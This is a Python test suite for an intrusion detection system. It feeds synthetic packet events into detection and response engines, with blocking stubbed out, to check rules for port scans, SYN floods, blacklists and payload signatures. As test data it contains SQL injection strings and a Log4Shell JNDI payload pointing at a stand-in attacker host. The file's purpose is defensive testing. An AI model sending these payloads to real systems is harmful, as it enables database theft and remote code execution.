"""
Simulated-traffic test suite. No live network/root needed - feeds synthetic
event dicts (the same schema packet_capture.py produces) straight into the
DetectionEngine to prove each rule fires correctly, then checks ResponseEngine
reacts (in DRY_RUN mode, so nothing is actually touched on this machine).
"""

import time
import os
import sys

import config
# Force safe settings for the test run regardless of what's in config.py
config.DRY_RUN = True
config.AUTO_BLOCK_ENABLED = True
config.ALERT_LOG_FILE = "test_alerts.log"
config.ALERT_LOG_JSON = "test_alerts.jsonl"

from alert_manager import AlertManager
from detection_engine import DetectionEngine
from response_engine import ResponseEngine


def fresh_stack():
    am = AlertManager()
    de = DetectionEngine(am)
    re = ResponseEngine(am)
    orig = am.raise_alert
    def wrapped(*a, **kw):
        alert = orig(*a, **kw)
        if alert:
            re.handle_alert(alert)
        return alert
    am.raise_alert = wrapped
    return am, de, re


def test_port_scan():
    am, de, re = fresh_stack()
    now = time.time()
    for port in range(2000, 2000 + config.PORT_SCAN_UNIQUE_PORT_THRESHOLD + 2):
        de.process_packet({
            "src_ip": "10.0.0.50", "dst_ip": "10.0.0.1", "dst_port": port,
            "proto": "TCP", "flags": "S", "timestamp": now,
        })
    alerts = am.recent(10)
    assert any(a["rule"] == "port_scan" for a in alerts), "port scan not detected"
    print("[PASS] port_scan detection")


def test_syn_flood():
    am, de, re = fresh_stack()
    now = time.time()
    for i in range(config.SYN_FLOOD_COUNT_THRESHOLD + 5):
        de.process_packet({
            "src_ip": "10.0.0.51", "dst_ip": "10.0.0.1", "dst_port": 80,
            "proto": "TCP", "flags": "S", "timestamp": now,
        })
    alerts = am.recent(10)
    assert any(a["rule"] == "syn_flood" for a in alerts), "syn flood not detected"
    critical = [a for a in alerts if a["rule"] == "syn_flood"][0]
    assert critical["action_taken"] in ("dry_run_block", "blocked"), "response engine did not act"
    print("[PASS] syn_flood detection + auto-response")


def test_signature_sql_injection():
    am, de, re = fresh_stack()
    de.process_packet({
        "src_ip": "10.0.0.52", "dst_ip": "10.0.0.1", "dst_port": 80,
        "proto": "TCP", "flags": "PA",
        "payload": b"GET /product?id=1 UNION SELECT username,password FROM users",
        "timestamp": time.time(),
    })
    alerts = am.recent(10)
    assert any(a["rule"] == "signature:sql_injection_union_select" for a in alerts), "SQLi not detected"
    print("[PASS] payload signature detection (SQL injection)")


def test_log4shell_signature():
    am, de, re = fresh_stack()
    de.process_packet({
        "src_ip": "10.0.0.53", "dst_ip": "10.0.0.1", "dst_port": 443,
        "proto": "TCP", "flags": "PA",
        "payload": b"User-Agent: ${jndi:ldap://evil.example.com/a}",
        "timestamp": time.time(),
    })
    alerts = am.recent(10)
    assert any(a["rule"] == "signature:log4shell_jndi" for a in alerts), "log4shell not detected"
    assert alerts[0]["severity"] == "critical"
    print("[PASS] payload signature detection (log4shell)")


def test_blacklist():
    am, de, re = fresh_stack()
    with open(config.BLACKLIST_FILE, "w") as f:
        f.write("203.0.113.66\n")
    de = DetectionEngine(am)  # reload with blacklist file present
    de.process_packet({
        "src_ip": "203.0.113.66", "dst_ip": "10.0.0.1", "dst_port": 22,
        "proto": "TCP", "flags": "S", "timestamp": time.time(),
    })
    alerts = am.recent(10)
    assert any(a["rule"] == "blacklisted_ip" for a in alerts), "blacklist not enforced"
    print("[PASS] static blacklist enforcement")
    os.remove(config.BLACKLIST_FILE)


def test_whitelist_never_alerts():
    am, de, re = fresh_stack()
    for port in range(2000, 2000 + config.PORT_SCAN_UNIQUE_PORT_THRESHOLD + 5):
        de.process_packet({
            "src_ip": "127.0.0.1", "dst_ip": "10.0.0.1", "dst_port": port,
            "proto": "TCP", "flags": "S", "timestamp": time.time(),
        })
    alerts = am.recent(10)
    assert len(alerts) == 0, "whitelisted IP should never alert"
    print("[PASS] whitelist exemption")


def test_dedupe():
    am, de, re = fresh_stack()
    now = time.time()
    with open(config.BLACKLIST_FILE, "w") as f:
        f.write("198.51.100.9\n")
    de = DetectionEngine(am)
    for _ in range(5):
        de.process_packet({
            "src_ip": "198.51.100.9", "dst_ip": "10.0.0.1", "dst_port": 22,
            "proto": "TCP", "flags": "S", "timestamp": now,
        })
    alerts = [a for a in am.recent(20) if a["src_ip"] == "198.51.100.9"]
    assert len(alerts) == 1, f"expected dedupe to collapse to 1 alert, got {len(alerts)}"
    print("[PASS] alert dedupe window")
    os.remove(config.BLACKLIST_FILE)


def test_scapy_packet_conversion():
    """Prove packet_capture.py correctly parses real scapy packets end-to-end."""
    from scapy.layers.inet import IP, TCP
    from packet_capture import packet_to_event

    pkt = IP(src="10.0.0.99", dst="10.0.0.1") / TCP(sport=5555, dport=4444, flags="S")
    event = packet_to_event(pkt)
    assert event["src_ip"] == "10.0.0.99"
    assert event["dst_port"] == 4444
    assert event["proto"] == "TCP"
    assert "S" in event["flags"]
    print("[PASS] scapy packet -> event conversion")

    # Feed it through the real detection engine to prove full pipeline works
    am, de, re = fresh_stack()
    payload_pkt = (IP(src="10.0.0.98", dst="10.0.0.1") /
                   TCP(sport=1234, dport=80, flags="PA") /
                   b"' OR 1=1 --")
    ev = packet_to_event(payload_pkt)
    de.process_packet(ev)
    alerts = am.recent(10)
    assert any(a["rule"] == "signature:sql_injection_or_1eq1" for a in alerts)
    print("[PASS] full pipeline: scapy packet -> event -> detection -> alert")


if __name__ == "__main__":
    tests = [
        test_port_scan,
        test_syn_flood,
        test_signature_sql_injection,
        test_log4shell_signature,
        test_blacklist,
        test_whitelist_never_alerts,
        test_dedupe,
        test_scapy_packet_conversion,
    ]
    failed = 0
    for t in tests:
        try:
            t()
        except AssertionError as e:
            failed += 1
            print(f"[FAIL] {t.__name__}: {e}")
    print(f"\n{len(tests) - failed}/{len(tests)} tests passed")
    for f in (config.ALERT_LOG_FILE, config.ALERT_LOG_JSON):
        if os.path.exists(f):
            os.remove(f)
    sys.exit(1 if failed else 0)
